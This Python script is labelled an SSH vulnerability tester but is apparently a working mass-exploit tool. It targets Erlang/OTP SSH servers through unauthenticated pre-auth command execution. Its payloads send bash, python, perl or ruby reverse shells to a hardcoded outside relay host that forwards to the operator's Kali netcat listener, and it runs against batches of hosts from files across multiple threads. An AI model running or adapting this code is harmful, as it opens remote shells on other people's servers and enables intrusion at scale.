import argparse
import socket
import struct
import time
import sys
import logging
from pathlib import Path
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Attempt to import tqdm for progress bar, fallback to identity if unavailable
try:
    from tqdm import tqdm
except ImportError:
    def tqdm(iterator, **kwargs):
        return iterator

# Configure logger
def setup_logger(verbose: bool):
    logger = logging.getLogger(__name__)
    handler = logging.StreamHandler()
    formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    return logger

# Default parameters
DEFAULT_THREADS = 8

# Hardcoded reverse shell settings - DO NOT CHANGE
# These settings connect to the portmap.io address which forwards to your Kali on port 7779
LISTENER_IP = "ogash96-45913.portmap.io"
LISTENER_PORT = "45913"

def parse_args():
    parser = argparse.ArgumentParser(
        description="Enhanced SSH pre-auth vulnerability tester with robust reverse shell capabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single host test:
    python exploit_tester.py --host <IP> --port <Port>

  Batch mode with output file:
    python exploit_tester.py --hosts-file targets.txt --ports-file ports.txt --output-file results.txt

  Custom reverse shell target:
    python exploit_tester.py --host <IP> --port <Port> --reverse-shell <IP>:<Port>

  Increase threads and verbose mode:
    python exploit_tester.py --hosts-file targets.txt --ports-file ports.txt --threads 16 --verbose
"""
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--host", help="Single target IP or hostname")
    group.add_argument("--hosts-file", type=Path, help="File with one host per line")
    parser.add_argument("--port", type=int, help="Single target port (1-65535)")
    parser.add_argument("--ports-file", type=Path, help="File with one port per line; must match hosts-file lines")
    # Removed customizable reverse shell - using hardcoded values only
    parser.add_argument("--channel-id", type=int, default=0, help="SSH channel ID (default: 0)")
    parser.add_argument("--window-size", type=int, default=0x68000, help="Initial window size")
    parser.add_argument("--max-pkt-size", type=int, default=0x10000, help="Max packet size")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Concurrent threads")
    parser.add_argument("--output-file", type=Path, help="Write results to file")
    parser.add_argument("--verbose", action="store_true", help="Enable debug logging")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout in seconds (default: 5)")
    parser.add_argument("--shell-type", choices=["bash", "python", "perl", "ruby"], default="bash", 
                        help="Reverse shell payload type (default: bash)")
    return parser.parse_args()


def string_payload(s: str) -> bytes:
    sb = s.encode()
    return struct.pack(">I", len(sb)) + sb


def pad_packet(payload: bytes, block_size: int = 8) -> bytes:
    """Pad SSH packet to block size"""
    payload_len = len(payload)
    rem = (payload_len + 1) % block_size
    padding_len = (block_size - rem) if rem != 0 else 0
    if padding_len < 4:  # Minimum padding
        padding_len += block_size
    total_len = payload_len + 1 + padding_len
    if total_len % block_size != 0:
        raise ValueError(f"Packet length {total_len} not aligned to block size {block_size}")
    header = struct.pack(">I", total_len)
    return header + bytes([padding_len]) + payload + b"\x00" * padding_len


def build_kexinit():
    """Build SSH key exchange initialization packet"""
    cookie = b"\x00" * 16
    def name_list(items):
        return string_payload(",".join(items))

    return (
        b"\x14" + cookie +
        name_list([
            "curve25519-sha256",
            "ecdh-sha2-nistp256", 
            "diffie-hellman-group-exchange-sha256",
            "diffie-hellman-group14-sha256"
        ]) +
        name_list(["rsa-sha2-256", "rsa-sha2-512"]) +
        name_list(["aes128-ctr"]) * 2 +
        name_list(["hmac-sha1"]) * 2 +
        name_list(["none"]) * 2 +
        name_list([]) * 2 +
        b"\x00" +
        struct.pack(">I", 0)
    )


def build_channel_open(cid: int, window: int, max_pkt: int) -> bytes:
    """Build SSH channel open packet"""
    return (
        b"\x5a" + string_payload("session")
        + struct.pack(">I", cid)
        + struct.pack(">I", window)
        + struct.pack(">I", max_pkt)
    )


def build_channel_request(cid: int, command: str) -> bytes:
    """Build SSH channel request packet with command execution"""
    if not isinstance(command, str) or not command.strip():
        raise ValueError("Invalid command string for channel request")
    return (
        b"\x62"
        + struct.pack(">I", cid)
        + string_payload("exec")
        + b"\x01"
        + string_payload(command)
    )


def get_reverse_shell_payload(shell_type: str, rs_ip: str, rs_port: str) -> str:
    """Generate reverse shell payload based on the selected type"""
    # All shells will connect to ogash96-45913.portmap.io:45913
    rs_ip = "ogash96-45913.portmap.io"  # Hardcoded
    rs_port = "45913"                   # Hardcoded
    
    if shell_type == "bash":
        # Multi-layered bash reverse shell with error handling and persistence
        return (
            f'os:cmd("bash -c \''
            f'(bash -i >& /dev/tcp/{rs_ip}/{rs_port} 0>&1 || '
            f'sh -i >& /dev/tcp/{rs_ip}/{rs_port} 0>&1 || '
            f'exec 5<>/dev/tcp/{rs_ip}/{rs_port}; cat <&5 | while read line; do $line 2>&5 >&5; done) &'
            f'\'").'
        )
    elif shell_type == "python":
        return (
            f'os:cmd("python -c \''
            f'import socket,subprocess,os;'
            f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            f's.connect((\"{rs_ip}\",{rs_port}));'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'p=subprocess.call([\"/bin/sh\",\"-i\"]);'
            f'\'").'
        )
    elif shell_type == "perl":
        return (
            f'os:cmd("perl -e \''
            f'use Socket;$i=\"{rs_ip}\";$p={rs_port};'
            f'socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'
            f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");'
            f'open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'
            f'\'").'
        )
    elif shell_type == "ruby":
        return (
            f'os:cmd("ruby -rsocket -e \''
            f'exit if fork;c=TCPSocket.new(\"{rs_ip}\",\"{rs_port}\");'
            f'while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'
            f'\'").'
        )
    else:
        # Fallback to bash
        return f'os:cmd("bash -c \'bash -i >& /dev/tcp/{rs_ip}/{rs_port} 0>&1\'").'


def exploit_target(host: str, port: int, args, logger) -> bool:
    """Execute the vulnerability test against a target"""
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror as e:
        logger.error(f"[{host}:{port}] DNS resolution failed: {e}")
        return False
    if not (1 <= port <= 65535):
        logger.error(f"[{host}:{port}] Port out of range: {port}")
        return False

    logger.info(f"[{host}:{port}] Starting vulnerability test")
    try:
        with socket.create_connection((ip, port), timeout=args.timeout) as s:
            logger.debug(f"[{host}:{port}] Sending client banner")
            s.sendall(b"SSH-2.0-Erlang/4.9.1.3\r\n")
            time.sleep(0.2)
            banner = s.recv(1024)
            if not banner.startswith(b"SSH-"):
                logger.error(f"[{host}:{port}] Invalid banner: {banner}")
                return False
            logger.info(f"[{host}:{port}] Banner received: {banner.strip()}")

            # Send key exchange initialization
            time.sleep(0.2)
            s.sendall(pad_packet(build_kexinit()))
            try:
                response = s.recv(4096)
                if b"Key exchange failed" in response:
                    logger.warning(f"[{host}:{port}] Target returned 'Key exchange failed' â€” likely patched.")
                    return False
                if not response:
                    logger.warning(f"[{host}:{port}] No response after KEXINIT. Might be patched or silently dropped.")
                    return False
                elif response[0] == 1:
                    logger.warning(f"[{host}:{port}] Received SSH_MSG_DISCONNECT. Target likely patched.")
                    return False
                else:
                    logger.debug(f"[{host}:{port}] Received KEX response (hex): {response.hex()}")
            except socket.timeout:
                logger.warning(f"[{host}:{port}] Timeout after KEXINIT. Target may be patched.")
                return False
            except Exception as e:
                logger.warning(f"[{host}:{port}] Error after KEXINIT: {e}. Assuming patched.")
                return False

            # Send channel open request
            time.sleep(0.2)
            s.sendall(pad_packet(build_channel_open(args.channel_id, args.window_size, args.max_pkt_size)))

            # Create and send reverse shell - hardcoded to portmap.io address
            reverse_cmd = get_reverse_shell_payload(args.shell_type, LISTENER_IP, LISTENER_PORT)
            
            logger.info(f"[{host}:{port}] Sending reverse shell payload to {LISTENER_IP}:{LISTENER_PORT}")
            req = build_channel_request(args.channel_id, reverse_cmd)
            s.sendall(pad_packet(req))
            
            # Try to get response
            s.settimeout(3)
            try:
                response = s.recv(4098)
                if response:
                    logger.info(f"[{host}:{port}] Received response ({len(response)} bytes)")
                    logger.debug(f"[{host}:{port}] Response hex: {response.hex()}")
            except socket.timeout:
                logger.debug(f"[{host}:{port}] Response timeout (may still be successful)")

        logger.info(f"[{host}:{port}] Exploit attempt complete - check your Kali listener on port 7779")
        return True
    except Exception as e:
        logger.error(f"[{host}:{port}] Connection or exploit error: {e}")
        return False


def process_targets_with_threadpool(targets, args, logger):
    """Process multiple targets using thread pool"""
    success = 0
    fout = None
    lock = threading.Lock()
    
    if args.output_file:
        try:
            fout = args.output_file.open("w")
            fout.write("Target,Status,Timestamp\n")
        except Exception as e:
            logger.error(f"Cannot open output file {args.output_file}: {e}")
            sys.exit(1)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for host, port in targets:
            futures.append(executor.submit(exploit_target, host, port, args, logger))
        
        pbar = tqdm(total=len(targets), desc="Testing targets", unit="host")
        original_level = logger.level
        logger.setLevel(logging.CRITICAL)  # Suppress logs during progress bar display
        
        for i, future in enumerate(as_completed(futures)):
            host, port = targets[i]
            result = future.result()
            if result:
                success += 1
            if fout:
                with lock:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    fout.write(f"{host}:{port},{result,timestamp}\n")
            pbar.update(1)
        
        pbar.close()
        logger.setLevel(original_level)  # Restore original log level
    
    if fout:
        fout.close()
    
    return success


def main():
    args = parse_args()
    logger = setup_logger(args.verbose)
    
    targets = []
    
    if args.host:
        if args.port is None:
            logger.error("--port is required when using --host")
            sys.exit(1)
        targets.append((args.host, args.port))
    else:
        if not args.ports_file:
            logger.error("--ports-file is required when using --hosts-file")
            sys.exit(1)
        hosts = [line.strip() for line in args.hosts_file.read_text().splitlines() if line.strip()]
        ports = [int(line.strip()) for line in args.ports_file.read_text().splitlines() if line.strip()]
        if len(hosts) != len(ports):
            logger.error("Hosts file and ports file must have the same number of entries")
            sys.exit(1)
        targets = list(zip(hosts, ports))

    logger.info(f"Starting SSH vulnerability tester with {args.threads} threads")
    logger.info(f"Reverse shell target: {LISTENER_IP}:{LISTENER_PORT}")
    logger.info(f"Shell type: {args.shell_type}")
    logger.info(f"Testing {len(targets)} target(s)")
    
    print("\n" + "=" * 60)
    print(f"  SSH VULNERABILITY TESTER - {len(targets)} TARGET(S)")
    print(f"  Reverse shell: {LISTENER_IP}:{LISTENER_PORT} (hardcoded)")
    print(f"  Shell type: {args.shell_type}")
    print("=" * 60 + "\n")
    
    # Make sure listener is ready
    print("\nBEFORE STARTING: Ensure your Kali listener is active with:")
    print(f"  nc -lvnp 7779  # This will receive connections forwarded from {LISTENER_IP}:{LISTENER_PORT}\n")
    
    start_time = time.time()
    if len(targets) > 1:
        success = process_targets_with_threadpool(targets, args, logger)
    else:
        # Single target mode doesn't need thread pool
        success = 1 if exploit_target(targets[0][0], targets[0][1], args, logger) else 0
    
    elapsed = time.time() - start_time
    
    print("\n" + "=" * 60)
    print(f"SUMMARY: {success}/{len(targets)} targets tested successfully")
    print(f"Time elapsed: {elapsed:.2f} seconds")
    print("=" * 60 + "\n")
    
    if success > 0:
        print("Successful tests should have established reverse shells.")
        print(f"Check your Kali listener on port 7779 (forwarded from {LISTENER_IP}:{LISTENER_PORT})")
    
    return 0


if __name__ == "__main__":
    main()
